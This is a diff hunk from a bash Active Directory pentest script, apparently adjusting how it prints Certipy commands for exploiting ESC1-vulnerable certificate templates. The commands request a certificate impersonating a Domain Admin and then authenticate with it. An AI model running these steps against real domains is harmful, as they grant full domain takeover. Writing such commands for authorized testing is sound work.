@@ -1989,9 +1989,9 @@ adcs_vuln_parse() {
         for vulntemp in $esc1_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dc_NETBIOS} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip} -sid [ ${sid_domain}-500 ]"
+            echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip}"
         done
     fi
 
